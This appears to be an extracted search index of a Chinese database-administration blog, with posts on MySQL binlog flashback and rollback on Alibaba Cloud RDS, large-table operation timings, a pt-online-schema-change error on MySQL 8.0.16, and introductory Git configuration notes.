74# at 961#200508 17:09:12 server id 1003306 end_log_pos 1270 CRC32 0x47f9804d Write_rows: table id 74 flags: STMT_END_FBINLOG &apos;uCG1XhMqTw8AVQAAAMEDAAAAAEoAAAAAAAEABmJvb2JvbwAOdGVzdGZsYXNoYmFjazIADAMPD/YEBRISEfz8/A5QABAEEwkECAYAAAICA/4O2XwXsw==uCG1Xh4qTw8ANQEAAPYEAAAAAEoAAAAAAAEAAgAM//8A8AIAAAADYWFhzQBiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJigAAAAAodzWUAmpkpQWZmZmZmZiVAmZ30oAAAAACZnfSgAFnxQaAEAGNjY2MEAGRkZGQDAABlZWVNgPlH&apos;/*!*/;### INSERT INTO `booboo`.`testflashback2`### SET### @1=2 /* INT meta=0 nullable=0 is_null=0 */### @2=&apos;aaa&apos; /* VARSTRING(80) meta=80 nullable=1 is_null=0 */### @3=&apos;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&apos; /* VARSTRING(1040) meta=1040 nullable=1 is_null=0 */### @4=10.500000000 /* DECIMAL(19,9) meta=4873 nullable=1 is_null=0 */### @5=10.6 /* FLOAT meta=4 nullable=1 is_null=0 */### @6=10.699999999999999289 /* DOUBLE meta=8 nullable=1 is_null=0 */### @7=&apos;2017-10-26 10:00:00.000000&apos; /* DATETIME(6) meta=6 nullable=1 is_null=0 */### @8=&apos;2017-10-26 10:00:00&apos; /* DATETIME(0) meta=0 nullable=1 is_null=0 */### @9=1508983200 /* TIMESTAMP(0) meta=0 nullable=0 is_null=0 */### @10=&apos;cccc&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @11=&apos;dddd&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @12=&apos;eee&apos; /* MEDIUMBLOB/MEDIUMTEXT meta=3 nullable=1 is_null=0 */# at 1270#200508 17:09:12 server id 1003306 end_log_pos 1301 CRC32 0xaf0eaeb3 Xid = 154COMMIT/*!*/;SET @@SESSION.GTID_NEXT= &apos;AUTOMATIC&apos; /* added by mysqlbinlog */ /*!*/;# at 1301#200508 17:09:13 server id 1003306 end_log_pos 1348 CRC32 0x53ecb2a7 Rotate to mysql-bin.000079 pos: 4DELIMITER ;# End of log fileROLLBACK /* added by mysqlbinlog */;/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/;2. 执行生产flashback文件 flashback --binlogFileNames=/alidata/mysql/log/mysql-bin.000078 123456789[root@node1 log]# flashback --binlogFileNames=/alidata/mysql/log/mysql-bin.000078[root@node1 log]# ll总用量 28-rw-r--r--. 1 root root 970 5月 8 17:19 binlog_output_base.flashback-rw-rw----. 1 mysql mysql 5991 5月 8 17:08 mysql-bin.000077-rw-rw----. 1 mysql mysql 1348 5月 8 17:09 mysql-bin.000078-rw-rw----. 1 mysql mysql 191 5月 8 17:09 mysql-bin.000079-rw-rw----. 1 mysql mysql 108 5月 8 17:09 mysql-bin.index-rw-r--r--. 1 root root 795 4月 14 16:23 test.sql 3. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134[root@node1 log]# mysqlbinlog binlog_output_base.flashback/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=1*/;/*!40019 SET @@session.max_insert_delayed_threads=0*/;/*!50003 SET @OLD_COMPLETION_TYPE=@@COMPLETION_TYPE,COMPLETION_TYPE=0*/;DELIMITER /*!*/;# at 4#200508 17:08:40 server id 1003306 end_log_pos 120 CRC32 0x2b689980 Start: binlog v 4, server v 5.6.45-log created 200508 17:08:40BINLOG &apos;mCG1Xg8qTw8AdAAAAHgAAAAAAAQANS42LjQ1LWxvZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzgNAAgAEgAEBAQEEgAAXAAEGggAAAAICAgCAAAACgoKGRkAAYCZaCs=&apos;/*!*/;# at 120#200508 17:09:12 server id 1003306 end_log_pos 205 CRC32 0xb3177cd9 Table_map: `booboo`.`testflashback2` mapped to number 74# at 205#200508 17:09:12 server id 1003306 end_log_pos 514 CRC32 0x47f9804d Delete_rows: table id 74 flags: STMT_END_FBINLOG &apos;uCG1XhMqTw8AVQAAAM0AAAAAAEoAAAAAAAEABmJvb2JvbwAOdGVzdGZsYXNoYmFjazIADAMPD/YEBRISEfz8/A5QABAEEwkECAYAAAICA/4O2XwXsw==uCG1XiAqTw8ANQEAAAICAAAAAEoAAAAAAAEAAgAM//8A8AIAAAADYWFhzQBiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJigAAAAAodzWUAmpkpQWZmZmZmZiVAmZ30oAAAAACZnfSgAFnxQaAEAGNjY2MEAGRkZGQDAABlZWVNgPlH&apos;/*!*/;# at 514#200508 17:09:12 server id 1003306 end_log_pos 545 CRC32 0x637a4759 Xid = 153COMMIT/*!*/;# at 545#200508 17:09:12 server id 1003306 end_log_pos 630 CRC32 0x541898f4 Table_map: `booboo`.`testflashback2` mapped to number 74# at 630#200508 17:09:12 server id 1003306 end_log_pos 939 CRC32 0x9df50e18 Delete_rows: table id 74 flags: STMT_END_FBINLOG &apos;uCG1XhMqTw8AVQAAAHYCAAAAAEoAAAAAAAEABmJvb2JvbwAOdGVzdGZsYXNoYmFjazIADAMPD/YEBRISEfz8/A5QABAEEwkECAYAAAICA/4O9JgYVA==uCG1XiAqTw8ANQEAAKsDAAAAAEoAAAAAAAEAAgAM//8A8AEAAAADYWFhzQBiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJigAAAAAodzWUAmpkpQWZmZmZmZiVAmZ30oAAAAACZnfSgAFnxQaAEAGNjY2MEAGRkZGQDAABlZWUYDvWd&apos;/*!*/;# at 939#200508 17:09:12 server id 1003306 end_log_pos 970 CRC32 0x637a4759 Xid = 153COMMIT/*!*/;DELIMITER ;# End of log fileROLLBACK /* added by mysqlbinlog */;/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/;[root@node1 log]# mysqlbinlog -v -v binlog_output_base.flashback/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=1*/;/*!40019 SET @@session.max_insert_delayed_threads=0*/;/*!50003 SET @OLD_COMPLETION_TYPE=@@COMPLETION_TYPE,COMPLETION_TYPE=0*/;DELIMITER /*!*/;# at 4#200508 17:08:40 server id 1003306 end_log_pos 120 CRC32 0x2b689980 Start: binlog v 4, server v 5.6.45-log created 200508 17:08:40BINLOG &apos;mCG1Xg8qTw8AdAAAAHgAAAAAAAQANS42LjQ1LWxvZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzgNAAgAEgAEBAQEEgAAXAAEGggAAAAICAgCAAAACgoKGRkAAYCZaCs=&apos;/*!*/;# at 120#200508 17:09:12 server id 1003306 end_log_pos 205 CRC32 0xb3177cd9 Table_map: `booboo`.`testflashback2` mapped to number 74# at 205#200508 17:09:12 server id 1003306 end_log_pos 514 CRC32 0x47f9804d Delete_rows: table id 74 flags: STMT_END_FBINLOG &apos;uCG1XhMqTw8AVQAAAM0AAAAAAEoAAAAAAAEABmJvb2JvbwAOdGVzdGZsYXNoYmFjazIADAMPD/YEBRISEfz8/A5QABAEEwkECAYAAAICA/4O2XwXsw==uCG1XiAqTw8ANQEAAAICAAAAAEoAAAAAAAEAAgAM//8A8AIAAAADYWFhzQBiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJigAAAAAodzWUAmpkpQWZmZmZmZiVAmZ30oAAAAACZnfSgAFnxQaAEAGNjY2MEAGRkZGQDAABlZWVNgPlH&apos;/*!*/;### DELETE FROM `booboo`.`testflashback2`### WHERE### @1=2 /* INT meta=0 nullable=0 is_null=0 */### @2=&apos;aaa&apos; /* VARSTRING(80) meta=80 nullable=1 is_null=0 */### @3=&apos;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&apos; /* VARSTRING(1040) meta=1040 nullable=1 is_null=0 */### @4=10.500000000 /* DECIMAL(19,9) meta=4873 nullable=1 is_null=0 */### @5=10.6 /* FLOAT meta=4 nullable=1 is_null=0 */### @6=10.699999999999999289 /* DOUBLE meta=8 nullable=1 is_null=0 */### @7=&apos;2017-10-26 10:00:00.000000&apos; /* DATETIME(6) meta=6 nullable=1 is_null=0 */### @8=&apos;2017-10-26 10:00:00&apos; /* DATETIME(0) meta=0 nullable=1 is_null=0 */### @9=1508983200 /* TIMESTAMP(0) meta=0 nullable=0 is_null=0 */### @10=&apos;cccc&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @11=&apos;dddd&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @12=&apos;eee&apos; /* MEDIUMBLOB/MEDIUMTEXT meta=3 nullable=1 is_null=0 */# at 514#200508 17:09:12 server id 1003306 end_log_pos 545 CRC32 0x637a4759 Xid = 153COMMIT/*!*/;# at 545#200508 17:09:12 server id 1003306 end_log_pos 630 CRC32 0x541898f4 Table_map: `booboo`.`testflashback2` mapped to number 74# at 630#200508 17:09:12 server id 1003306 end_log_pos 939 CRC32 0x9df50e18 Delete_rows: table id 74 flags: STMT_END_FBINLOG &apos;uCG1XhMqTw8AVQAAAHYCAAAAAEoAAAAAAAEABmJvb2JvbwAOdGVzdGZsYXNoYmFjazIADAMPD/YEBRISEfz8/A5QABAEEwkECAYAAAICA/4O9JgYVA==uCG1XiAqTw8ANQEAAKsDAAAAAEoAAAAAAAEAAgAM//8A8AEAAAADYWFhzQBiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJigAAAAAodzWUAmpkpQWZmZmZmZiVAmZ30oAAAAACZnfSgAFnxQaAEAGNjY2MEAGRkZGQDAABlZWUYDvWd&apos;/*!*/;### DELETE FROM `booboo`.`testflashback2`### WHERE### @1=1 /* INT meta=0 nullable=0 is_null=0 */### @2=&apos;aaa&apos; /* VARSTRING(80) meta=80 nullable=1 is_null=0 */### @3=&apos;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&apos; /* VARSTRING(1040) meta=1040 nullable=1 is_null=0 */### @4=10.500000000 /* DECIMAL(19,9) meta=4873 nullable=1 is_null=0 */### @5=10.6 /* FLOAT meta=4 nullable=1 is_null=0 */### @6=10.699999999999999289 /* DOUBLE meta=8 nullable=1 is_null=0 */### @7=&apos;2017-10-26 10:00:00.000000&apos; /* DATETIME(6) meta=6 nullable=1 is_null=0 */### @8=&apos;2017-10-26 10:00:00&apos; /* DATETIME(0) meta=0 nullable=1 is_null=0 */### @9=1508983200 /* TIMESTAMP(0) meta=0 nullable=0 is_null=0 */### @10=&apos;cccc&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @11=&apos;dddd&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @12=&apos;eee&apos; /* MEDIUMBLOB/MEDIUMTEXT meta=3 nullable=1 is_null=0 */# at 939#200508 17:09:12 server id 1003306 end_log_pos 970 CRC32 0x637a4759 Xid = 153COMMIT/*!*/;DELIMITER ;# End of log fileROLLBACK /* added by mysqlbinlog */;/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/; 导入数据库mysqlbinlog -v -v binlog_output_base.flashback | mysql -uroot -proot 12[root@node1 log]# mysqlbinlog -v -v binlog_output_base.flashback | mysql -uroot -prootWarning: Using a password on the command line interface can be insecure. 检查执行结果 1234567[root@node1 log]# mysql -uroot -proot -e &quot;select count(*) from booboo.testflashback2&quot;Warning: Using a password on the command line interface can be insecure.+----------+| count(*) |+----------+| 0 |+----------+ 如何对阿里云RDS进行闪回难点： 阿里云的binlog获取方法 阿里云账号没有Super权限因此需要处理binlog日志删除备注信息。 阿里云的binlog获取方法 若binlog日志已上传至oss，则需要在控制台进行下载，下载时需要注意找到主的日志（阿里云RDS日志包含主和被的日志） 若binlog日志还在实例本地，则需要在控制台先点击一键上传，待日志上传到oss后，从控制台下载 处理binlog日志的备注信息12# 5.6版本mysqlbinlog -v -v --skip-gtids binlog_output_base.flashback | sed &apos;s@\\/\\*.*\\*\\/@@&apos; |mysql -uroot -proot 其他方法对于阿里云RDS实例，若待回滚的表中，没有blob字段建议使用binlog2sql。 1234# 远程在线获取binlog日志mysqlbinlog -vv -P 3306 -uxxx -pxxxx -hxxxxx.mysql.rds.aliyuncs.com --read-from-remote-server --start-datetime=&apos;2017-09-12 06:29:00&apos; --stop-datetime=&apos;2017-09-12 06:30:01&apos; --base64-output=DECODE-ROWS mysql-bin.000634 &gt; taiping0912.binlog# binlog2sql远程连接数据库直接生成回滚sqlpython binlog2sql.py -P 3306 -uxxx -pxxxx -hxxxxx.mysql.rds.aliyuncs.com -t tablenamexxx --start-file=&apos;mysql-bin.000001&apos; --start-position=4946 --stop-position=5921 -B","link":"/2020/04/24/booboo_others/2020-05-08-tec-mysql/"},{"title":"数据库大表常用操作耗时记录","text":"大表操作 表大小 索引大小 总大小 操作行数 实例规格 耗时 资源影响 表大小 2.73 亿行 8核32G RDS 创建索引 4 亿 8核32G RDS 2小时 创建索引 2.73 亿 8核32G RDS 27分钟18.94秒 查询4月份数据 0.4 亿 8核32G RDS 1分13.62秒 计算4月份数据 0.4 亿 8核32G RDS 约25分钟 需改列数据类型 8 亿 14小时16分钟 IOPS打满5000 CPU内存有小幅度上升","link":"/2020/05/11/booboo_others/2020-05-11-tec-mysql/"},{"title":"MySQL8.0.16使用pt-online-schema-change在线添加索引报错处理","text":"在线MySQL8.0结构变更问题排查 报错明细 解决方法 测试环境 MySQL测试数据 pt-online-ddl 执行结果 总结 在线MySQL8.0结构变更问题排查 软件 版本 mysql-server 8.0.16 pt-tools 3.2.0 报错明细123456789101112[root@node2 install]# pt-online-schema-change --port=3306 --host=localhost --user=root --password=xxx --alter=&quot;add index TMS_LEG_IDS (ID,CHANGE_ORG_ID,FROM_RECEIVER_ID,TO_RECEIVER_ID,TO_REGIONZONE_ID)&quot; D=wlyotwb,t=tms_leg_test --no-version-check --execute --charset=utf8No slaves found. See --recursion-method if host node2 has slaves.Not checking slave lag because no slaves were found and --check-slave-lag was not specified.Operation, tries, wait: analyze_table, 10, 1 copy_rows, 10, 0.25 create_triggers, 10, 1 drop_triggers, 10, 1 swap_tables, 10, 1 update_foreign_keys, 10, 1There is an error in MySQL that makes the server to die when trying to rename a table with FKs. See https://bugs.mysql.com/bug.php?id=96145Since pt-online-schema change needs to rename the old &lt;-&gt; new tables as the final step, and the requested table has FKs, it cannot be executed under the current MySQL version https://jira.percona.com/browse/PT-1782 解决方法 pt-tools软件版本使用 3.0.13 或者 mysql-server版本升级到 8.0.20 测试环境MySQL测试数据123456alter user root@&apos;localhost&apos; identified WITH mysql_native_password by &apos;Zyadmin123&apos;;flush privileges;create database booboo;create table booboo.t1 (id int primary key);insert into booboo.t1 values (1); pt-online-ddl12yum localinstall -y percona-toolkit-3.2.0-1.el7.x86_64.rpmpt-online-schema-change --port=3306 --host=localhost --user=root --password=Zyadmin123 --alter=&quot;add column name varchar(22)&quot; D=booboo,t=t1 --no-version-check --execute --charset=utf8 执行结果123456789101112131415161718192021222324252627[root@node2 install]# pt-online-schema-change --port=3306 --host=localhost --user=root --password=Zyadmin123 --alter=&quot;add column name varchar(22)&quot; D=booboo,t=t1 --no-version-check --execute --charset=utf8No slaves found. See --recursion-method if host node2 has slaves.Not checking slave lag because no slaves were found and --check-slave-lag was not specified.Operation, tries, wait: analyze_table, 10, 1 copy_rows, 10, 0.25 create_triggers, 10, 1 drop_triggers, 10, 1 swap_tables, 10, 1 update_foreign_keys, 10, 1Altering `booboo`.`t1`...Creating new table...Created new table booboo._t1_new OK.Altering new table...Altered `booboo`.`_t1_new` OK.2020-05-12T21:26:08 Creating triggers...2020-05-12T21:26:08 Created triggers OK.2020-05-12T21:26:08 Copying approximately 1 rows...2020-05-12T21:26:08 Copied rows OK.2020-05-12T21:26:08 Analyzing new table...2020-05-12T21:26:09 Swapping tables...2020-05-12T21:26:09 Swapped original and new tables OK.2020-05-12T21:26:09 Dropping old table...2020-05-12T21:26:09 Dropped old table `booboo`.`_t1_old` OK.2020-05-12T21:26:09 Dropping triggers...2020-05-12T21:26:09 Dropped triggers OK.Successfully altered `booboo`.`t1`. 总结不同的数据库版本对应的pt工具版本会有区别，具体可以访问percona-toolkit v3.2.0 released 2019-04-20Improvements: PT-1773: Don’t make the foreign key check in pt-online-schema-change if not needed. PT-1757: pt-table-checksum can now handle small tables as a single chunk. PT-1813: MariaDB 10.4 is now supported. Bug fixes: PT-1782: pt-online-schema-change declined to handle tables because of foreign keys even when there were no foreign keys with some MariaDB 10.2 and MySQL 8 versions. PT-1759: pt-stalk with --mysql-only option didn’t collect MySQL Status variables. PT-1802: pt-online-schema-change didn’t handle self-referencing foreign keys properly which caused an unnecessarily high resource consumption. PT-1766: pt-table-checksum DIFF_ROWS was not computed correctly. PT-1760: pt-online-schema-change regression caused it to hang for a stopped replica when using replication channels on the slave. PT-1707: A number of the Percona Toolkit tools failed to operate in the IPv6 environment if the host address specified as a parameter was not enclosed in square brackets. PT-1502: pt-online-schema-change was not recognizing the slave with multi-source replication active. PT-1824: pt-online-schema-change allowed the name of a constraint to exceed 64 characters when --alter-foreign-keys-method=rebuild_constraints was used. (Thank you, Iwo Panowicz.) PT-1765: Documentation for DIFF_ROWS doesn’t exist. PT-297: pt-online-schema-change could break replication. PT-1768: Source code for src/go/pt-mongodb-query-digest/pt-mongodb-query-digest was missing in the official source tar ball. PT-1576: pt-stalk with ``–mysql-onlyoption was not adding MySQLprocesslist` information to the output file. PT-1793: pt-query-digest was unable to handle the year 2020 because of wrong tcpdump parsing. (Thank you, Kei Tsuchiya.) v3.0.13 released 2019-01-03Improvements PT-1340: pt-stalk now doesn’t call mysqladmin debug command by default to avoid flooding in the error log when not needed. CMD_MYSQLADMIN=&quot;mysqladmin debug&quot; environment variable reverts pt-stalk to the previous way of operation. PT-1637: A new --fail-on-stopped-replication option allows pt-table-checksum to detect failing slave nodes. Fixed bugs PT-1673: pt-show-grants was incompatible with MariaDB 10+ (thanks Tim Birkett) PT-1638: pt-online-schema-change was erroneously taking MariaDB 10.x for MySQL 8.0 and rejecting to work with it to avoid the upstream bug #89441 scope. PT-1616: pt-table-checksum failed to resume on large tables with binary strings containing invalid UTF-8 characters. PT-1573: pt-query-digest didn’t work in case of log_timestamps = SYSTEM my.cnf option. PT-1114: pt-table-checksum failed when the table was empty. PT-157: Specifying a non-primary key index with the i part of the --source argument made pt-archiver to ignore the --primary-key-only option presence.","link":"/2020/05/12/booboo_others/2020-05-12-tec-mysql/"},{"title":"玩转Git三剑客学习笔记-第02课-安装Git","text":"帮助链接Git 官方文档地址： https://git-scm.com/book/zh/v2 macOS 平台 Git 下载地址： https://git-scm.com/download/mac Windows 平台 Git 下载地址：https://git-scm.com/download/win Linux 平台 Git 下载地址：https://git-scm.com/download/linux 如何安装Git官方安装步骤 安装比较简单，通过官方帮助一步一步去完成即可。 版本控制的历史及作用版本控制的作用对于IT这个行业来说，经常会遇到一个问题：代码分散的拷贝在各个分区之中，不知道哪个代码文件是最新的，哪个代码文件是最优的。失败的复制、替换经常会导致原来尚能运行的代码遭到破坏。于是，针对以上的问题就产生了一种解决方案，这种方案我们成为版本控制。版本控制系统是能够随着时间的推进记录一系列文件的变化以便于你以后想要的退回到某个版本的系统。 版本控制的历史1）CVS：最早期的版本控制工具称为CVS，于1985年由荷兰阿姆斯特丹VU大学的Dick Grune教授完成开发，奠定了后续版本控制软件的模型基础。CVS采用C/S模型，版本库位于服务端，实际上存储的文件可以理解为一个RCS容器。每一个RCS文件以’.v‘作为后缀，保存该文件的每一次更改历史，使得其存储十分有效。然而CVS也存在如下缺点：1.效率不高，服务端文件越多，处理速度越慢。2.合并困难重重，经常会遇到严重冲突。3.不能直接对文件和目录的重命名进行版本控制，会破坏数据。 2）SVN：SVN全名为subversion，由collabNet公司于2000年开发，目的是为了弥补CVS的不足，创建一个性能更加强大的版本控制系统来取代CVS。到了2001年的时候，SVN已经可以用于市场环境。SVN拥有以下几个特征：1.轻量级拷贝。2.以授权文件的方式来实现版本库的授权。2.在工作区的隐藏目录下会保存一份冗余的原始拷贝。然而，SVB比起CVS在本质上并没有突破。到2009年年底，SVN被交由APACHE社区管理，至此svn成为了apache的一个子项目。 3）GIT：GIT由linux之父linus于2005年开发，在结构上比起SVN和CVS有很大的提升。可以说GIT是世界上目前最优秀的版本控制系统之一。GIT的每个功能都作为一条独立的命令，导致git庞大的命令集，但这并不妨碍各大程序人员对于GIT的喜爱，原因就在于它一个分布式的版本控制系统。此外：GIT虽然是基于linux操作系统开发的，但目前已经可以跨平台运行在多种操作系统之上，包括linux，MAC OS X，Windows等。 版本控制系统的分类版本控制主要分为三大类：本地版本控制系统，集中式版本控制系统和分布式版本控制系统。 本地版本控制：将文件的各个版本以一定的数据格式存储在本地的磁盘，这种方式在一定的程度上解决了手动复制黏贴的问题，但无法解决多人协作的问题。 集中式版本控制：比起本地版本控制多了一个中央服务器，各个版本的数据存储在中央服务器，管理员可以控制开发人员的权限，而开发人员也可以从中央服务器拉取数据。集中式版本控制解决了团队协作问题，但缺点是所有数据存储在中央服务器，服务器一旦宕机，会造成不可估量的损失。SVN和CVS都是集中式版本控制。 分布式版本控制，系统保存的不是文件变化的差两，而是文件的快照。分布式版本控制系统是分布式的，当你从中央服务器拷贝下来代码时，你拷贝的是一个完整的版本库，包括历史纪录，提交记录等，即使某一台机器宕机，也能够找到文件的完整备份。GIT就是分布式版本控制。","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/02_%E5%AE%89%E8%A3%85Git/"},{"title":"玩转Git三剑客学习笔记-第01课-课程综述","text":"为什么Git? GitHub是全球最大的开源社区，里面存放了很多优秀的开源项目的代码 GitLab的社区版本现在也被国内很多知名的互联网企业当作是代码管理的平台 GitHub和GitLab这两个平台在整个DevOps盛行的大环境中，他们不仅仅提供了代码管理的功能，他们还向外扩展提供了整个DevOps全生命周期的全流程的解决方案 怎么学习？ 掌握Git 熟悉GitHub和GitLab这两个平台的主要功能 通过简单的项目走一遍团队协作、代码review和分支集成、以及整个持续交付的过程 收获什么？ 掌握Git的基本命令 掌握Git的工作原理 能基于GitHub和GitLab这两个平台做团队协作、代码review和分支集成的活动 了解如何在GitHub和GitLab上如何开展持续交付活动","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/01_%E8%AF%BE%E7%A8%8B%E7%BB%BC%E8%BF%B0/"},{"title":"玩转Git三剑客学习笔记-第03课-使用Git之前需要做的最小配置","text":"配置user信息 配置user.name 和 user.email 12git config --global user.name &apos;your_name&apos;git config --global user.email &apos;your_email.domain.com&apos; 仓库中变更的信息会和用户和邮件捆绑在一起，需要配置好user信息。 设置，缺省等同于 --local 清除，--unset 12git config --unset --global user.namegit config --unset --global user.email 优先级 local &gt; global &gt; system git config 命令 官方帮助 原理 命令只是为了更方便地修改配置文件，我们应该知其所以然。 Git 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置： /etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 --system 选项的 git config 时，它会从此文件读写配置变量。 ~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 可以传递 --global 选项让 Git 读写此文件。 当前使用仓库的 Git 目录中的 config 文件（就是 .git/config）：针对该仓库。 每一个级别覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。 在 Windows 系统中，Git 会查找 $HOME 目录下（一般情况下是 C:\\Users\\$USER）的 .gitconfig 文件。 Git 同样也会寻找 /etc/gitconfig 文件，但只限于 MSys 的根目录下，即安装 Git 时所选的目标位置。 语法git config [参数] config 作用域 参数 配置文件 说明 一个仓库 git config --local .git/config local只对某个仓库有效 当前用户 git config --global ~/.gitconfig 或 ~/.config/git/config global对当前用户所有仓库有效 当前系统 git config --system /etc/gitconfig system对系统所有登陆用户有效 帮助1234# 查看Manual Page详细帮助信息$ git help config# 查看简易帮助信息$ git config 练习 我的环境为windows 1 找到一个仓库，查看该仓库中的所有文件，包含隐藏文件。12345678910rgwei@DESKTOP-G9S0U3G MINGW64 /$ ll /c/Users/rgwei/Desktop/GitHub/DBA_Git -atotal 29drwxr-xr-x 1 rgwei 197121 0 12月 12 20:13 ./drwxr-xr-x 1 rgwei 197121 0 2月 11 14:27 ../drwxr-xr-x 1 rgwei 197121 0 12月 12 20:21 .git/drwxr-xr-x 1 rgwei 197121 0 12月 12 19:57 .idea/-rw-r--r-- 1 rgwei 197121 1400 12月 12 11:57 README.md-rw-r--r-- 1 rgwei 197121 13 12月 12 20:13 test.mddrwxr-xr-x 1 rgwei 197121 0 2月 12 10:23 第一章：Git基础/ 2 使用git config命令 和 配置文件 分别查看仓库的配置情况1234567891011121314151617181920212223242526272829rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --local --listcore.repositoryformatversion=0core.filemode=falsecore.bare=falsecore.logallrefupdates=truecore.symlinks=falsecore.ignorecase=trueremote.origin.url=git@github.com:BoobooWei/DBA_Git.gitremote.origin.fetch=+refs/heads/*:refs/remotes/origin/*branch.master.remote=originbranch.master.merge=refs/heads/masterrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ cat .git/config[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true[remote &quot;origin&quot;] url = git@github.com:BoobooWei/DBA_Git.git fetch = +refs/heads/*:refs/remotes/origin/*[branch &quot;master&quot;] remote = origin merge = refs/heads/masterheads/master 3 分别查看当前仓库、当前用户、系统的git配置情况12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --local 